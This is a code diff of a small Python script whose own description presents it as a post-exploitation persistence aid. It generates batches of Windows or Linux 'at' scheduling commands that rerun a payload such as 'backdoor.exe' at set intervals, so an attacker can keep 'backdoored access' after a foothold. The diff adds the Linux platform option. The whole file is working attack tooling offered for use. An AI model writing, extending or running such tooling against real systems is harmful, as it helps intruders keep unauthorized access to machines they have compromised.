@@ -1,28 +1,47 @@
 #!/usr/bin/env python3
 from argparse import ArgumentParser
 
+LINUX_OS_NAME = 'linux'
+WINDOWS_OS_NAME = 'windows'
+
 
 def get_arguments():
     parser = ArgumentParser(
-                description="When an initial foothold is established, it's good to have a lot of scheduled tasks of "
-                            "getting your shell back. "
-                            "Old versions of Windows don't have schtasks.exe utility, but they have AT utility.")
-    parser.add_argument('--time', dest='time', required=True,
+        description="When an initial foothold is established, it's good to have a lot of scheduled tasks of "
+                    "getting your shell back. "
+                    "Old versions of Windows don't have schtasks.exe utility, but they have AT utility. "
+                    "As well as Linux distributions should have AT utility installed on their systems. "
+                    "This software may help you to maintain your backdoored access.")
+    parser.add_argument('--time',
+                        dest='time',
+                        required=True,
                         help='Time span to use while generating AT statements, in the following format: 01:45-22:30')
-    parser.add_argument('--period', dest='period', required=True,
+    parser.add_argument('--period',
+                        dest='period',
+                        required=True,
                         help='Time period to use, in the following format: 10min')
-    parser.add_argument('--cmd', dest='cmd', required=True,
+    parser.add_argument('--cmd',
+                        dest='cmd',
+                        required=True,
                         help='Command to use in generated AT statements, in the following format: '
                              '"C:\\WINDOWS\\system32\\backdoor.exe"')
+    parser.add_argument('--platform',
+                        dest='platform',
+                        choices=[LINUX_OS_NAME, WINDOWS_OS_NAME],
+                        required=True,
+                        help='A platform of scheduled manager to generate commands for.')
     options = parser.parse_args()
     return options
 
 
-def line(h, m, path):
-    return f"at {h:02d}:{m:02d} \"{path}\""
+def line(h, m, path, platform):
+    if platform == WINDOWS_OS_NAME:
+        return f"at {h:02d}:{m:02d} \"{path}\""
+    if platform == LINUX_OS_NAME:
+        return f"at {h:02d}:{m:02d} -f \"{path}\""
 
 
-def generate_list(timespan: str, period: str, path: str):
+def generate_list(timespan: str, period: str, path: str, platform):
     start, end = timespan.split('-')
     start_h, start_min = [int(i) for i in start.split(':')]
     end_h, end_min = [int(i) for i in end.split(':')]
@@ -49,14 +68,14 @@ def generate_list(timespan: str, period: str, path: str):
             _end_min = end_min if timestamp_h == _end_h else 60
 
             for timestamp_min in range(_start_min, _end_min, period[1]):
-                yield line(timestamp_h, timestamp_min, path)
+                yield line(timestamp_h, timestamp_min, path, platform)
         else:
-            yield line(timestamp_h, start_min, path)
+            yield line(timestamp_h, start_min, path, platform)
         first_time = False
 
 
 if __name__ == "__main__":
     options = get_arguments()
     timespan, period, path = options.time, options.period, options.cmd
-    data = '\n'.join(generate_list(timespan, period, path))
+    data = '\n'.join(generate_list(timespan, period, path, options.platform))
     print(data)
